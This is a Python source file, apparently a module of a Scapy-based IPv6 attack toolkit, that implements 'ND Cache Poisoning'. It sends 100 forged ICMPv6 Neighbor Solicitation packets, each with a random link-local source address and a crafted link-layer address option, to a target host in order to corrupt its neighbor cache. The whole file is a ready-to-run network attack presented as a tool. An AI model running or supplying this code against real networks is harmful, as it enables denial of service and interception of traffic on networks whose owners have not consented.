from scapy.all import *
from copy import copy
import sys
from multiprocessing.pool import ThreadPool, Pool
from template import Template
import random  
import time

sys.path.insert(0,'..')
from ipv6.ipv6 import createIPv6, get_source_address, grabRawDst, grabRawSrc, getMacAddress

class IPv6Module(Template):

    def __init__(self, socketio, namespace):
        super(IPv6Module, self).__init__(socketio, namespace)
        self.modname = "ND Cache Poisoning"
        self.actions = [
            {
                "title": "ND Cache Poisoning",
                "action": "action",
                "target": True
            },
        ]

    def action(self, target=None):
        self.sniffer = IPv6Sniffer(self)
        self.socket_log('Poisoning cache on %s.' % target)
        counter = 0
        while counter < 100:
            self.cache_poison(target)
            counter += 1
        self.socket_log('Poisoning cache finished.')

    def cache_poison(self, target, dst=get_source_address(IPv6(dst="ff02::1"))):
        M = 16**4
        src = "fe80::" + ":".join(("%x" % random.randint(0, M) for i in range(4)))
        
        lladdr = getMacAddress(src)

        ip_packet = createIPv6()
        ip_packet.fields["version"] = 6L
        ip_packet.fields["tc"] = 0L
        ip_packet.fields["nh"] = 58
        ip_packet.fields["hlim"] = 255
        ip_packet.fields["src"] = src
        ip_packet.fields["dst"] = target["ip"]

        icmp_packet = ICMPv6ND_NS()
        icmp_packet.fields["code"] = 0
        icmp_packet.fields["res"] = 0
        icmp_packet.fields["type"] = 135
        icmp_packet.fields["tgt"] = target["ip"]

        llpacket = ICMPv6NDOptSrcLLAddr()
        llpacket.fields["type"] = 1
        llpacket.fields["len"] = 1
        llpacket.fields["lladdr"] = lladdr

        send(ip_packet/icmp_packet/llpacket)

        time.sleep(1)